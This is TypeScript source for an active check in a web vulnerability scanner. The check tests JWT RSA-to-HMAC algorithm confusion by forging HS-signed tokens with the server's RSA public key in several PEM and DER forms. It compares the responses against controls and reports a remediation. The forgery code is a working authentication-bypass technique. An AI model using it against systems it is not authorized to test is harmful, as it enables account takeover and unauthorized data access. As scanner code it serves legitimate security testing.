import { parsePublicPem, pkcs1FromSpki, toPem } from "./rsa-material";
import type { ScanCheck, ScanCheckContext, Exchange } from "./types";
import { decodeJwtPart, encodeJwtPart } from "./token-graphql-checks";
import { withoutCredentials } from "./http-checks";
import { withHeader } from "./parameters";
import { compareResponses } from "../response-diff";
import { ok, text, result, observation } from "./extended-checks";
const success = (x: Exchange) => ok(x) && x.response!.status >= 200 && x.response!.status < 300;
const denied = (x: Exchange) => ok(x) && [401, 403].includes(x.response!.status);
function same(a: Exchange, b: Exchange, ctx: ScanCheckContext) {
  if (!success(a) || !success(b) || !text(a).trim()) return false;
  const d = compareResponses(a.response!, b.response!, ctx.diffOptions);
  return !d.statusChanged && !d.bodyChanged;
}
const bytes = (s: string): Uint8Array<ArrayBuffer> =>
  Uint8Array.from(atob(s.replace(/-/g, "+").replace(/_/g, "/")), (c) => c.charCodeAt(0));
const b64 = (b: ArrayBuffer | Uint8Array) => btoa(String.fromCharCode(...new Uint8Array(b)));
const url64 = (b: ArrayBuffer) => b64(b).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
const pem = (der: ArrayBuffer) =>
  `-----BEGIN PUBLIC KEY-----\n${b64(der)
    .match(/.{1,64}/g)!
    .join("\n")}\n-----END PUBLIC KEY-----`;
interface Candidate {
  key: CryptoKey;
  der: ArrayBuffer;
  source: string;
  originalPem?: string;
  certificate?: Uint8Array<ArrayBuffer>;
}
export const jwtConfusion: ScanCheck = {
  id: "jwt-confusion",
  name: "JWT RSA/HMAC algorithm confusion",
  active: true,
  perParameter: false,
  async run(ctx) {
    if (!globalThis.crypto?.subtle)
      return result("Web Crypto unavailable; use localhost or HTTPS.", true);
    const auth = Object.entries(ctx.request.headers).find(
      ([k]) => k.toLowerCase() === "authorization",
    )?.[1];
    const token = auth?.match(/^Bearer ([\w-]+\.[\w-]+\.[\w-]+)$/i)?.[1];
    if (!token || token.length > 24000)
      return result("Bounded signed RSA Bearer JWT required.", true);
    const [head, payload, signature] = token.split(".") as [string, string, string];
    let header: Record<string, unknown>;
    try {
      header = decodeJwtPart(head);
      decodeJwtPart(payload);
    } catch {
      return result("Malformed JWT.", true);
    }
    const rsaAlgorithms: Record<string, string> = {
      RS256: "SHA-256",
      RS384: "SHA-384",
      RS512: "SHA-512",
    };
    const alg = header["alg"];
    if (typeof alg !== "string" || !Object.hasOwn(rsaAlgorithms, alg))
      return result("RSA/HMAC confusion requires an RS256, RS384 or RS512 token.", true);
    if (
      !ctx.stable ||
      ctx.baselines.length < 2 ||
      !ctx.baselines.every((x) => success(x) && text(x).trim())
    )
      return result("Stable successful nonempty RSA JWT baselines required.", true);
    const hash = rsaAlgorithms[alg]!;
    const imports = { name: "RSASSA-PKCS1-v1_5", hash };
    const candidates: Candidate[] = [],
      resources: Exchange[] = [];
    if (ctx.jwtPublicKey?.trim()) {
      try {
        const value = ctx.jwtPublicKey;
        const parsed = parsePublicPem(value);
        const der = parsed.spki.buffer;
        const key = await crypto.subtle.importKey("spki", der, imports, true, ["verify"]);
        candidates.push({
          key,
          der,
          source: "Configured RSA public key/certificate",
          originalPem: value,
          ...(parsed.certificate && { certificate: parsed.certificate }),
        });
      } catch {
        return result("Configured key is not a valid RSA SPKI, PKCS#1 or certificate PEM.", true);
      }
    } else if (ctx.loadJwtResource) {
      const origin = new URL(ctx.request.url).origin;
      const load = async (url: string) => {
        const x = await ctx.loadJwtResource!(url);
        resources.push(x);
        if (!success(x) || text(x).length > 32000) return undefined;
        try {
          return JSON.parse(text(x));
        } catch {
          return undefined;
        }
      };
      const sets = new Map<string, unknown>();
      for (const path of ["/.well-known/jwks.json", "/jwks.json"]) {
        const url = origin + path;
        sets.set(url, await load(url));
      }
      const metadata = await load(origin + "/.well-known/openid-configuration");
      if (typeof metadata?.jwks_uri === "string" && metadata.jwks_uri.length <= 4096) {
        try {
          const url = new URL(metadata.jwks_uri, origin);
          if (
            url.origin === origin &&
            !url.username &&
            !url.password &&
            !url.hash &&
            !sets.has(url.href)
          )
            sets.set(url.href, await load(url.href));
        } catch {
          /* Invalid discovery URI is ignored; never follow foreign origins. */
        }
      }
      for (const [source, value] of sets) {
        const keys = (value as { keys?: unknown[] } | undefined)?.keys;
        if (!Array.isArray(keys) || keys.length > 32) continue;
        for (const raw of keys) {
          if (candidates.length >= 10) break;
          const jwk = raw as Record<string, unknown> | null;
          if (
            !jwk ||
            jwk["kty"] !== "RSA" ||
            typeof jwk["n"] !== "string" ||
            typeof jwk["e"] !== "string" ||
            jwk["n"].length > 1500 ||
            jwk["e"].length > 16 ||
            !/^[\w-]+$/.test(jwk["n"]) ||
            !/^[\w-]+$/.test(jwk["e"]) ||
            (typeof header["kid"] === "string" &&
              jwk["kid"] !== undefined &&
              jwk["kid"] !== header["kid"]) ||
            (jwk["use"] !== undefined && jwk["use"] !== "sig") ||
            (jwk["alg"] !== undefined && jwk["alg"] !== alg)
          )
            continue;
          try {
            // Import public components only; never trust token-supplied jwk/jku/x5u.
            const key = await crypto.subtle.importKey(
              "jwk",
              { kty: "RSA", n: jwk["n"], e: jwk["e"] },
              imports,
              true,
              ["verify"],
            );
            const der = await crypto.subtle.exportKey("spki", key);
            let certificate: Uint8Array<ArrayBuffer> | undefined;
            if (Array.isArray(jwk["x5c"]) && typeof jwk["x5c"][0] === "string" && jwk["x5c"][0].length <= 12000) {
              try {
                const parsed = parsePublicPem(toPem("CERTIFICATE", bytes(jwk["x5c"][0])));
                if (b64(parsed.spki) === b64(der)) certificate = parsed.certificate;
              } catch { /* Invalid or mismatched certificate is not used. */ }
            }
            candidates.push({ key, der, source, ...(certificate && { certificate, originalPem: toPem("CERTIFICATE", certificate) }) });
          } catch {
            /* Unsupported public key. */
          }
        }
      }
    }
    let selected: Candidate | undefined;
    for (const key of candidates) {
      try {
        if (
          await crypto.subtle.verify(
            "RSASSA-PKCS1-v1_5",
            key.key,
            bytes(signature),
            new TextEncoder().encode(`${head}.${payload}`),
          )
        ) {
          selected = key;
          break;
        }
      } catch {
        /* Invalid signature or incompatible key. */
      }
    }
    if (!selected)
      return result(
        "No matching RSA public key verified the original JWT. Provide an RSA SPKI PEM or expose same-origin JWKS; confusion not tested.",
        true,
      );
    const clean = withoutCredentials(ctx.request).request;
    const original = withHeader(clean, "Authorization", `Bearer ${token}`);
    const isolated = await ctx.probe(original, "JWT confusion isolated original control");
    const anonymous = await ctx.probe(clean, "JWT confusion anonymous control");
    const malformed = await ctx.probe(
      withHeader(clean, "Authorization", `Bearer ${ctx.nonce()}`),
      "JWT confusion malformed control",
    );
    const bad = `${head}.${payload}.${signature[0] === "A" ? "B" : "A"}${signature.slice(1)}`;
    const rsaInvalid = await ctx.probe(
      withHeader(clean, "Authorization", `Bearer ${bad}`),
      "JWT confusion invalid RSA signature control",
    );
    if (
      !same(isolated, ctx.baselines[0]!, ctx) ||
      ![anonymous, malformed, rsaInvalid].every(denied)
    )
      return result(
        "Original JWT isolation or denied controls failed; algorithm confusion cannot be attributed.",
        true,
      );
    const canonical = pem(selected.der);
    const pkcs1 = pkcs1FromSpki(new Uint8Array(selected.der));
    const pkcs1Pem = toPem("RSA PUBLIC KEY", pkcs1);
    const representations: [string, Uint8Array<ArrayBuffer>][] = [
      ...[
        ...new Set(
          [
            selected.originalPem,
            canonical,
            pkcs1Pem,
            pkcs1Pem + "\n",
            pkcs1Pem.replace(/\n/g, "\r\n"),
            pkcs1Pem.replace(/\n/g, "\r\n") + "\r\n",
            canonical + "\n",
            canonical.replace(/\n/g, "\r\n"),
            canonical.replace(/\n/g, "\r\n") + "\r\n",
          ].filter((s): s is string => s !== undefined),
        ),
      ].map(
        (s, i) =>
          [`PEM serialization ${i + 1}`, new TextEncoder().encode(s)] as [
            string,
            Uint8Array<ArrayBuffer>,
          ],
      ),
      ["SPKI DER", new Uint8Array(selected.der)],
      ["PKCS#1 DER", pkcs1],
      ...(selected.certificate ? [["Certificate DER", selected.certificate] as [string, Uint8Array<ArrayBuffer>]] : []),
    ];
    for (const hmac of ["HS256", "HS384", "HS512"]) {
      for (const [format, keyBytes] of representations) {
        const key = await crypto.subtle.importKey(
          "raw",
          keyBytes,
          { name: "HMAC", hash: `SHA-${hmac.slice(2)}` },
          false,
          ["sign"],
        );
        const rows: Exchange[] = [];
        let accepted = true;
        for (let i = 0; i < 2; i++) {
          const changed = encodeJwtPart({ ...header, alg: hmac, slurp_probe: ctx.nonce() });
          const input = `${changed}.${payload}`;
          const signed = `${input}.${url64(await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(input)))}`;
          // A same-algorithm random-key control separates confusion from ignored HMAC signatures.
          const wrongKey = await crypto.subtle.importKey(
            "raw",
            crypto.getRandomValues(new Uint8Array(32)),
            { name: "HMAC", hash: `SHA-${hmac.slice(2)}` },
            false,
            ["sign"],
          );
          const wrong = `${input}.${url64(await crypto.subtle.sign("HMAC", wrongKey, new TextEncoder().encode(input)))}`;
          const negative = await ctx.probe(
            withHeader(clean, "Authorization", `Bearer ${wrong}`),
            "JWT confusion wrong HMAC key control",
          );
          const probe = await ctx.probe(
            withHeader(clean, "Authorization", `Bearer ${signed}`),
            `JWT ${alg} to ${hmac} (${format}) ${i + 1}`,
          );
          rows.push(negative, probe);
          if (!denied(negative) || !same(probe, isolated, ctx)) {
            accepted = false;
            break;
          }
        }
        if (!accepted) continue;
        const restore = await ctx.probe(original, "JWT confusion RSA original restore");
        if (!same(restore, isolated, ctx))
          return result("Original RSA response did not restore baseline.", true);
        const output = observation(
          `Possible JWT algorithm confusion: ${alg} to ${hmac}`,
          "The original JWT signature was verified locally with an RSA public key. Two independent HMAC tokens signed using that public key reproduced the authenticated response, while anonymous, malformed, invalid RSA signature and random HMAC key controls were denied. Claims were preserved and the original RSA response restored. Review protected-data access and server configuration; role escalation was not tested.",
          [
            ...ctx.baselines,
            ...resources,
            isolated,
            anonymous,
            malformed,
            rsaInvalid,
            ...rows,
            restore,
          ],
          [
            `Algorithms: ${alg} → ${hmac}`,
            `Public key source: ${selected.source}`,
            `HMAC key representation: ${format}`,
          ],
          "high",
        );
        output.findings[0]!.remediation =
          "Pin the allowed signing algorithm server-side and enforce asymmetric public-key types; never reuse an RSA public key as an HMAC secret.";
        return output;
      }
    }
    return result(
      "No RSA/HMAC confusion reproduced for supported SPKI/PKCS#1/certificate PEM and DER representations. Other key formats and algorithms are not covered.",
    );
  },
};
